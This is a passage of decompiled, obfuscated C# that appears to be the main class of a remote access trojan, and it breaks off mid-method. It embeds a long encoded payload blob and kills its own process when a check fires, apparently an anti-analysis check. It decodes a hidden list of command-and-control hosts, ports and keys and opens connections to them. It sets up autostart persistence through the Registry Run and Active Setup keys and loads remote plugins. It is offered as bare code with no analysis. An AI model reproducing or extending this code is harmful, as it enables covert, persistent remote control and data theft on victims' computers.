using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class11
{
	private const string string_0 = "iZbMPD88PDxAPDw8Ozs8PPQ8PDw8PDw8fDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8vDw8PEpb9ko88EUJXfQ9iAldkKSlr1ysrqujrp2pXJ+dqqqrsFyeoVyusapcpapcgIuPXKmroKFqSUlGYDw8PDw8PDyMgTw8iD0/PHcKyIo8PDw8PDw8PBw8Pl1HPUQ8PFg8PDxCPDw8PDw8ynY8PDxcPDw8fDw8PDx8PDxcPDw8Pjw8QDw8PDw8PDxAPDw8PDw8PDy8PDw8Pjw8PDw8PD88fME8PEw8PEw8PDw8TDw8TDw8PDw8PEw8PDw8PDw8PDw8PHx2PDyHPDw8PHw8PLw/PDw8PDw8PDw8PDw8PDw8PDw8PJw8PEg8PDzkdTw8WDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8XDw8RDw8PDw8PDw8PDw8RFw8PIQ8PDw8PDw8PDw8PGqwobSwPDw80FY8PDxcPDw8WDw8PD48PDw8PDw8PDw8PDw8PFw8PJxqrq+unzw8PLw/PDw8fDw8PEA8PDxaPDw8PDw8PDw8PDw8PDx8PDx8aq6hqKufPDxIPDw8PJw8PDw+PDw8Xjw8PDw8PDw8PDw8PDw8fDw8fjw8PDw8PDw8PDw8PDw8PDysdjw8PDw8PIQ8PDw+PEE85GE8PDxQPDw9PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PJI+ZE08PEY8PD6vTjw8RrlFPDxAPGY8PE9sPzyVPDw8PTw8TTyvTzw8RrxHPDxAr1A8PEa8Rjw8QLpGPDxAukc8PEA+q1E8PEY8ukc8PECrUjw8Rjy6Rzw8QKtTPDxGRrpHPDxAq1Q8PEY8ULxHPDxAULxGPDxAQkdnPENmPDw8T2w+PI88PDw+PDxNPD6vVTw8RrxHPDxAr1A8PEa8Rjw8QLpGPDxAukc8PECrVjw8RrFDPDw+RrpHPDxAq1I8PEY8ukc8PECrVDw8RjxQvEc8PEBQvEY8PEBCR2c8Q2ZaPmRNPDxGZjxPbD08Rzw8PD88PE0+t048PEBGZzxCZl4+P7lOPDxAZk9sPTxHPDw8QDw8TT63Tzw8QEZnPEJmXj4/uU88PEBmT2w/PIY8PDxBPDxNPD5kWDw8RmRZPDxGDFI8PD1kWjw8RlOrWzw8RkZCyqVSOj5SOj1IRGlSPEJS1rBSPDw9q1w8PEavXTw8RkdnRLpePDxGR2c8Q2ZGPGY8PDxPbD88bDw8PEI8PE0+t0g8PEBGQkdDP2RfPDxGsEg8PD1IPrhIPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0g8PEBGQkdDP2RhPDxGsEg8PD1IPrhIPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0k8PEBGQkdDP2RfPDxGsEg8PD1IPrhJPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0k8PEBGQkdDP2RhPDxGsEg8PD1IPrhJPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0o8PEBGQkdDP2RfPDxGsEg8PD1IPrhKPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0o8PEBGQkdDP2RhPDxGsEg8PD1IPrhKPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEM8PE0+t0s8PEBGQkdDP2RfPDxGsD88PD5IPrhLPDxARENkPjw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEM8PE0+t0s8PEBGQkdDP2RhPDxGsD88PD5IPrhLPDxARENkPjw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEQ8PE0+t0w8PEBGQkdDP2RfPDxGsD48PD5IPrhMPDxARENkPzw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEQ8PE0+t0w8PEBGQkdDP2RhPDxGsD48PD5IPrhMPDxARENkPzw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEU8PE0+t008PEBGQkdDP2RfPDxGsEA8PD5IPrhNPDxARENkQDw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEU8PE0+t008PEBGQkdDP2RhPDxGsEA8PD5IPrhNPDxARENkQDw8Z0ZCQzo9Ujo9SUVpFGZPbD88gDw8PEY8PE08P0ZCUmo+Z1k+t0s8PEBQOj1HQ2lKPrdLPDxAPkCrQjw8QjxnWT63TDw8QFA6PUdDaUo+t0w8PEA+QKs+PDxCPGc8Zk9sPzxZPDw8Rzw8TTw+t008PEBQOj1GQmlKPrdNPDxAPj+rRjw8QjxmPDw8T2w/PFk8PDxHPDxNPD63SDw8QFA6PUZCaUo+t0g8PEA+UKtiPDxGPGY8PDw/bD88hDw8PDw8PDw8PrdIPDxAUFCrYjw8Rjw+t0k8PEBQUKtiPDxGPD63Sjw8QFBQq2I8PEY8PrdMPDxAUFCrPjw8Qjw+t008PEBQUKtGPDxCPGZaPmRNPDxGZn6Phn49PD08PDw8PEg8PDyybmpsanFsc25zPDw8PEE8qDw8PEBFPDxfujw8rEU8PBxDPDxfj7Cupaqjrzw8PDyMTTw8RDw8PF+RjzyUTTw8TDw8PF+DkYWAPDw8pE08PNQ+PDxffqirnjw8PDw8PDw+PDw9k1nyRUVEPDw8NmFvPFI8PD08PDxhPDw8RTw8PE88PDxuPDw8bTw8PGI8PDxAPDw8Tzw8PEc8PDw9PDw8Qjw8PD08PDxIPDw8Vjw8PD08PDw9PDw8Pjw8PEA8PDw8PEY8PTw8PDw8QjzSPMs8QjzkPMs8QjzpPMs8Qjz9PMs8QjwKPMs8QjxYPcs8QjyDPWg9Qjy+PY89QjzbPdE9QjyYPss8RjzBPqw+QjwVPss8QjwzQCFAQjxKQSFAQjxnQSFAQjyGQSFAQjyfQSFAQjy4QSFAQjzTQSFAQjzuQSFAQjwmQQdBQjw6QQdBQjxIQiFAQjxhQiFAQjyRQn5CozylQjw8QjzUQrRCQjz0QrRCQjwSQss8QjwoQtE9QjxFQ7RCQjxgQ8s8QjxtQyFAQjyCQ8s8QjzKQ8s8QjzsQ9tDQjwPQ8s8PDw8PD08PDw8PD08PTw9PTw8UjxlPEE8PTw9PD09PDxsPGU8QTw9PEE8PT08PH48ZTxBPD08RTw9PTw8kzxlPEU8PTxJPD09PDyfPGU8RTxAPEk8PVxMPKQ8ZTxJPEM8STw9PEw8rzxlPEk8RjxKPL08TDy6PGU8STxIPE08QkIuPGY8krw2PGk8krw7PGk8QkIuPGY8krxDPXc8krxKPXc8QjxRPXs8QjxdPX48QjyKPYI8TTzOPY08TTzoPZE8PTwiPto8PTxjP9o8PTyGP9o8PTypP+Q8PTzGP+48PTzmP/g8PTwnPwo8PTxKQA48PDw8PD88wlTwPEY8PTw8PDw8PzwCPfY8TDw/PDw8PDw/PAI9GDxUPEE8PDw8PD88Aj0kPGA8RTw8PDw8PzzCVPA8RjxGPDw8PDw/PAI99jxMPEg8PDw8PD88Aj0YPFQ8Sjw8PDw8PzwCPSQ8YDxOPDw8PDw/PMJU8DxGPE88PDw8PD88Aj32PEw8UTw8PDw8PzwCPRg8VDxTPDw8PDw/PAI9JDxgPFc8jFw8PDw8wlTwPIk8WDykXDw8PDzSPOs9lTxYPAxcPDw8PNI89T2cPFk8a108PDw8wlTwPIk8Wjw8PDw8PDwCSQE9ozxaPDw8PDw8PAJJCj2jPFo8PDw8PDw8AkkaPaM8Wjw8PDw8PDwCSSU9pzxaPDw8PDw8PAJJNj2sPFo8PDw8PDw8AklOPqw8Wjw8PDw8PDwCSWA+rDxaPHRdPDw8PMJEbD6wPFo8i108PDw8wkSCPrU8Wjw8PDw8PDwCSaA+uzxbPDw8PDw8PAJJxj7APFs8lF08PDw8wkTUPsU8WzyrXTw8PDzCROQ+yTxbPLRdPDw8PMJE9D7OPFw8PDw8PDw8AkH9Pok8XDw8PDw8PDwCQQg+0zxcPApdPDw8PAI9ED7JPF48EF08PDw8wkQ0Pt48XzxMXjw8PDzCREo/3jxgPIhePDw8PMJEaz/ePGE8xF48PDw8wkR3P948YjwAXjw8PDzCRI4/3jxjPDxfPDw8PMJEmj/ePGQ8eF88PDw8wkSvP+g8ZTy0Xzw8PDzCRLk/6DxmPPBfPDw8PMJEzT/yPGc8LF88PDw8wkTYP/I8aDxoYDw8PDzCRO8//DxpPKRgPDw8PMJE/D/8PGo84GA8PDw8wjwMPwI8azwwYDw8PDzCPBE/tTxtPFxhPDw8PMI8HD+JPG48iGE8PDw8vTwlP4k8bjzcYTw8PDzAVPA8iTxuPDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTwDQDw8PTwIQDw8PTwKQDw8PTwKQDw8PTwQQDw8PjwlPzw8PTwQQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwcQDw8PjwlPzw8PTwlP6U88Dw2PK088Dw2PLU88Dw2PL088Dw2PMU88Dw2PM088Dw2PNU88Dw2PN088Dw2POU88Dw7PO088Dw2PPU88Dw2PP088Dw2PAU88DxAPRU88DxGPR088DyJPCU88DyJPFU88DyJPEg88DyJPIU88DyJPH088DyJPH086z1RPS08L0KJPIU8NUJYPS08PUOJPIU88DxkPX089T1qPTU88DyJPFU8ZUOAPUU9dkOGPT09lEOPPUU9pkOYPe08ukOjPG088Dw2PG08xEN+PFU900OpPV09+EO1PVU9CEOpPZ089jwIPUQ8RDxtPEQ8SDxyPEQ8UDxtPEQ8VDxyPGo8Xzw9Pmo8tzyyPmo8bzxKPmo8rzypPmo8RzwQPWo8TzwcPWo8Vzw3PWo8ZzwQPWo8dzw3PWo8hzw3PWo8jzxpPmo8nzyTPmo8pzygPn0+FzxyPJ0+FzxyPDw/FzxyPFw/FzxyPLw/FzxyPNw/FzxyPF09cD13PXw9oT3HPdY95T30Pf49BD1FPD08PDwiPm08PDxjP208PDyGP208PDypP0g8PDzGP0Q8PDzmP0w8RTw9PDw8Z0ARPDw8bEARPDw8eEARPDw8f0AVPDw8jEAaPDw8oEAaPDw8rkAaPDw8tkAePDw8mD4jPDw8yEAoPDw80kAtPDw8WD0xPEw8Xzw+PEQ8Xjw+PD48TTw/PEw8YTxAPEQ8YDxAPD48TjxBPEQ8YjxCPEw8YzxCPD48TzxDPEw8ZTxEPEQ8ZDxEPD48UDxFPEw8ZzxGPEQ8ZjxGPD48UTxHPEw8aTxIPEQ8aDxIPD48UjxJPD48UzxLPD48VDxNPD08VTxNPD48VjxPPD48VzxRPD08WTxTPD48WDxTPD48WjxVPEs9QLw8PD08PDw8PDw8PDw8PDw8ujw8PD48PDw8PDw8PDw8PD08wjw8PDw8Pjw8PDw8PDw8PDw8PTysPjw8PDyFPMI9hTzRPYU84D2FPO89PDw8eImroLGooXo8hYyosaOlqmqgqKg8i7GwrLGwgbKhqrCEnaqgqKGuPIyosaOlqjyFqqyxsIGyoaqwhJ2qoKihrjyOoZ+hpbKhoIGyoaqwhJ2qoKihrjyMqLGjpaqPsJ2woTyPpaChPIyosaOlqn2uo688j6GupZ2opbahrjyFjKixo6WqPKmvn6uuqKWePI+1r7ChqTyJsaiwpZ+dr7CAoaiho52woTyBqrGpPIuepqGfsDxqn7CrrjyFqrKrp6E8hX2vtaqfjqGvsaiwPH2vtaqff52oqJ6dn6c8fqGjpaqFqrKrp6E8PJJwSoGqoIWqsqunoTyynaixoZubPIqLioE8jpGKioWKgzx/iIWBipA8j4GOkoGOPIShnaChrjyDsaWgPIyosaOlqoOxpaA8j7WvsKGpan+rqKihn7Clq6qvaoOhqqGupZ88iKWvsJxtPICdsJ08j7WvsKGpao6xqrClqaFqj6GupZ2opbadsKWrqmqCq66pnbCwoa6van6lqp2utTx+paqdrrWCq66pnbCwoa48nqI8j7WvsKGpaoWLPImhqauutY+wrqGdqTyprzyPoa6lnailtqE8gKGvoa6lnailtqE8o6Gwm4qdqaE8o6Gwm4Chr5+upaywpauqPKOhsJt9sbCkq648o6Gwm3+xrq6hqrCPsJ2woTyjobCbj7CrrIuqgKWvn6uqqqGfsKWrqjyjobCbgbShn7GwoYuqiKudoDyjobCbhJ2vgquuqTyjobCbgbShn7GwoYuqiKudoH2uo688r6Gwm4G0oZ+xsKGLqoirnaB9rqOvPJKhrq+lq6o8o6Gwm5Khrq+lq6o8j7WvsKGpapOlqqCrs69qgquuqa88gquuqTyjobCbhaqssbCCq66pPKOhsJuPsJ2woYuepqGfsDyvobCbj7CdsKGLnqahn7A8o6Gwm4OxpaA8haqlsKWdqKW2oTyBtKGfsbChPI+wq6w8gbKhqrCEnaqgqKGuPIG0oZ+xsKWrqn+rqayoobChPJ2goJuBtKGfsbClq6p/q6msqKGwoTyuoamrsqGbgbShn7Gwpauqf6uprKihsKE8j7CdrrChoDydoKCbj7CdrrChoDyuoamrsqGbj7CdrrChoDyPsKusrKGgPJ2goJuPsKusrKGgPK6hqauyoZuPsKusrKGgPIWqrLGwPJ2goJuFqqyxsDyuoamrsqGbhaqssbA8i7GwrLGwPJ2goJuLsbCssbA8rqGpq7Khm4uxsKyxsDyOoZ+hpbKhoDydoKCbjqGfoaWyoaA8rqGpq7Khm46hn6GlsqGgPI+hqqA8i6qOoZ+hpbKhoDyBtKGfsbChoDyhPHiBtKGfsbChi6qIq52gfa6jr3qnm5t+nZ+npaqjgqWhqKA8eI+wnbChi56moZ+weqebm36dn6elqqOCpaGooDyKnamhPIChr5+upaywpauqPH2xsKSrrjx/sa6uoaqwj7CdsKE8j7CrrIuqgKWvn6uqqqGfsKWrqjyBtKGfsbChi6qIq52gPISdr4Krrqk8gbShn7GwoYuqiKudoH2uo688haqssbCCq66pPI+wnbChi56moZ+wPKuepqGfsDypobCkq6A8r6GqoKGuPJ+dqKienZ+nPK6hr7GosDydrqOvPJ48sp2osaE8r7CdsKGLnqahn7A8r6WgoTyPta+woalqjqGiqKGfsKWrqjx9r6+hqZ6otZClsKihfbCwrqWesbChPH2vr6Gpnqi1gKGvn66lrLClq6p9sLCupZ6xsKE8fa+voameqLV/q6qipaOxrp2wpauqfbCwrqWesbChPH2vr6Gpnqi1f6uprJ2qtX2wsK6lnrGwoTx9r6+hqZ6otYyuq6Cxn7B9sLCupZ6xsKE8fa+voameqLV/q6y1rqWjpLB9sLCupZ6xsKE8fa+voameqLWQrp2goamdrqd9sLCupZ6xsKE8fa+voameqLV/saiwsa6hfbCwrqWesbChPI+1r7ChqWqOsaqwpamhaoWqsKGuq6yPoa6ypZ+hrzx/q6mSpa+lnqihfbCwrqWesbChPIOxpaB9sLCupZ6xsKE8fa+voameqLWSoa6vpauqfbCwrqWesbChPH2vr6Gpnqi1gqWooZKhrq+lq6p9sLCupZ6xsKE8j7WvsKGpaoClnaOqq6+wpZ+vPIChnrGjo52eqKF9sLCupZ6xsKE8gKGesaOjpaqjiaugoa88j7WvsKGpao6xqrClqaFqf6uprKWooa6Poa6ypZ+hrzx/q6mspaidsKWrqo6hqJ20nbClq6qvfbCwrqWesbChPI6xqrClqaF/q6msnbClnqWopbC1fbCwrqWesbChPI+hrqWdqKW2nZ6ooX2wsK6lnrGwoTyPsK6hnak8f6irr6E8kKt9rq6dtTyApa+sq6+hPH+rqaylqKGug6Gqoa6dsKGgfbCwrqWesbChPJC1rKE8g6GwkLWsoTx9r6+hqZ6otTyDobB9r6+hqZ6otTyOsaqwpamhkLWsoYSdqqCooTyDobCQtayhgq6rqYSdqqCooTyDobB/sa+wq6l9sLCupZ6xsKGvPKOhsJuSnaixoTyBqaywtTyAoaiho52woTx/q6mepaqhPI+1r7ChqWqQpK6hnaClqqM8haqwoa6oq5+noaA8f6uprJ2uoYG0n6SdqqOhPI6hqauyoTyBsqGqsH2uo688PDw8PD9cPDw8PDwQWesgigzmfdRb52CkaXJ+PETztpiSVXAcxUFcPj1YVENcPj1OYE5YR1xATk1OYE5YTlFYQVw9PU5NPkJEP0JNUEA8PDw8QD08PDw/Qk1UPkJKP0JNVUJCUU5ZPVg/XDw9P0JOXT9CTmFCPD1ZQU5YQjw9TlhZQT9cPEpAXDxNUD9cPD5AXDxOWEFcPT1OWEBcPE5lQFw8Tmk/XDxYQFw9PVhAXDxNVUJcPj1YTlg/Qk5tQVw9PU5tP0JOSEFcPT1OSD9CTkRBXD09TkQ/Qk5MQVw9PU5MQ1w+PU1UTlg/Qk5YPkJYP2Q8SkBkPE1QP2Q8PkBkPE5YQGQ8TmVAZDxOaT9kPFhAZDxNVUBcPT1KQFw9PT5BXD09TaVAXD09REFRTlk9WEJcPj1OtVhAXDxZQUJDPllBWUFBXD09WUFBXD1YTrVCQz5OWE5YQEM9Tlg/Qz1YQVw8Try9RDw9TrzBTry9RDw9Try9TbzFRFw+WVhOvL0+Q0M/WVhNVT5HPD5OvMlOvMlOvMlITD0/WjxMWjxaPFo8QEY9Tm1FQ0BObU5tTm0+QEY9TkhFQ0BOSE5ITkg+QEY9TkRFQ0BORE5ETkQ+QEY9TkxFQ0BOTE5MTkw+QUM+TVQ+P0M9PkNcPj1YTrzRRz08QoyosaOlqjw8Vj08UYqhsGmToZ2yoVyMqLGjpapcfp2voTw8QT08PDw8SD08Q7SPpaihqrA8PFo9PFV/q6y1rqWjpLBc/uVctI+lqKGqsFxubG1tPDxlPTxgc29ynXChbHFpn551oWlwnnGiaXWgoHFpbp2fcnWhop9soHV1PDxIPTxDbWpsamxqbDw8RD08Qz08PDw8RD08RDw8PDw8Wj08PTyQPlKTrp2siquqgbSfoaywpauqkKSuq7OvPTw8PDw8PDx3CsiKPDw8PD48PDy2PDw8AHU8PABXPDyOj4CPrLPE+jaoPIm/8ElHoGav7T48PDx/dpiRr6Gur5iKnbCknaqYgKufsamhqrCvmJKlr7GdqFyPsLGgpatcbmxtbJiMrqumoZ+wr5iMrqumoZ+wXICAq4+hrpiMqLGjpaqYq56mmIChnrGjmIWMqLGjpapqrKCePDw8pHY8PDw8PDw8PDw8unY8PDxcPDw8PDw8PDw8PDw8PDw8PDw8PDw8PKx2PDw8PDw8PDybf6uugKioiZ2lqjypr5+rrqGhaqCoqDw8PDw8O2E8XHw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PTxMPDw8VDw8vDw8PDw8PDw8PDw8PDw8PTw9PDw8bDw8vDw8PDw8PDw8PDw8PDw8PTw8PDw8hDw8PJR8PDxgPzw8PDw8PDw8PDxgP3A8PDySPI88mzySPIE8jjyPPIU8izyKPJs8hTyKPII8izw8PDw8+UArOjw8PTw8PD08PDw8PDw8PTw8PDw8ezw8PDw8PDxAPDw8Pjw8PDw8PDw8PDw8PDw8PIA8PDw9PJI8nTyuPII8pTyoPKE8hTyqPKI8qzw8PDw8YDxAPDw8kDyuPJ08qjyvPKg8nTywPKU8qzyqPDw8PDw8POxAwD48PD08jzywPK48pTyqPKM8gjylPKg8oTyFPKo8ojyrPDw8nD48PD08bDxsPGw8bDxsPHA8njxsPDw8gDxSPD08fzyrPKk8qTyhPKo8sDyvPDw8ijyhPLA8aTyTPKE8nTyyPKE8XDyMPKg8sTyjPKU8qjxcPH48nTyvPKE8PDxsPEQ8PTx/PKs8qTysPJ08qjy1PIo8nTypPKE8PDw8PLQ8jzylPKg8oTyqPLA8PDx0PEM8PTyCPKU8qDyhPIA8oTyvPJ88rjylPKw8sDylPKs8qjw8PDw8jDyoPLE8ozylPKo8PDw8PGw8RDw9PII8pTyoPKE8kjyhPK48rzylPKs8qjw8PDw8bTxqPGw8ajxsPGo8bDw8PHQ8SDw9PIU8qjywPKE8rjyqPJ08qDyKPJ08qTyhPDw8hTyMPKg8sTyjPKU8qjxqPKA8qDyoPDw8lDxVPD08iDyhPKM8nTyoPH88qzysPLU8rjylPKM8pDywPDw8fzyrPKw8tTyuPKU8ozykPLA8XDzlPFw8tDyPPKU8qDyhPKo8sDxcPG48bDxtPG08PDw8PHw8SDw9PIs8rjylPKM8pTyqPJ08qDyCPKU8qDyhPKo8nTypPKE8PDyFPIw8qDyxPKM8pTyqPGo8oDyoPKg8PDxsPEM8PTyMPK48qzygPLE8nzywPIo8nTypPKE8PDw8PIw8qDyxPKM8pTyqPDw8PDxwPEQ8PTyMPK48qzygPLE8nzywPJI8oTyuPK88pTyrPKo8PDxtPGo8bDxqPGw8ajxsPDw8dDxEPD08fTyvPK88oTypPJ48qDy1PFw8kjyhPK48rzylPKs8qjw8PG08ajxsPGo8bDxqPGw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8bDw8SDw8PMx2PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PA==";

	private static List<GClass2> list_0;

	private static List<Class9> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class5.bool_13 && (!Class5.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class5.string_1, Class10.smethod_3(Class5.string_2, bool_0: true)))))
		{
			Class4.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class1.smethod_0(Class5.string_6);
		if (Class1.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class10.smethod_3(Class5.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class9>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class9 @class = new Class9(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class10.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Disconnected += smethod_10;
				@class.ConnectionAccepted += smethod_9;
				@class.Received += smethod_8;
				@class.Sent += smethod_11;
				list_1.Add(@class);
			}
		}
		GClass1.smethod_0();
		GClass0.PluginAdded += smethod_5;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		if (Class5.bool_0 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class5.string_1, Class10.smethod_3(Class5.string_2, bool_0: true)))
		{
			new Thread(Class7.smethod_0).Start();
		}
		if (Class5.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class5.string_1, Class10.smethod_3(Class5.string_2, bool_0: true)))
		{
			GClass1.smethod_3();
		}
		if (Class5.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class5.string_1, Class10.smethod_3(Class5.string_2, bool_0: true)))
		{
			GClass0.smethod_1();
		}
		else
		{
			GClass0.smethod_2();
		}
		if (Class5.bool_0)
		{
			list_0 = new List<GClass2>();
			GClass2 gClass = new GClass2(Class5.registryHive_0, Class5.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.RegChanged += smethod_2;
			if (Class5.bool_12)
			{
				if (Class5.bool_1)
				{
					GClass2 gClass2 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass2.RegChanged += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class5.bool_2)
				{
					GClass2 gClass3 = new GClass2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					gClass3.RegChanged += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class5.bool_3)
				{
					GClass2 gClass4 = new GClass2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components");
					gClass4.RegChanged += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class5.string_11 = smethod_21(smethod_20() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class9 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass2 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class6.smethod_2();
		if (Class5.bool_4)
		{
			smethod_18();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass0.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class7.smethod_2;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class5.bool_0)
		{
			Class7.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_15);
			iplugin_0.add_Output(new OutputEventHandler(smethod_14));
			iplugin_0.add_Started((EventHandler)smethod_13);
			iplugin_0.add_Stopped((EventHandler)smethod_12);
			GClass0.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
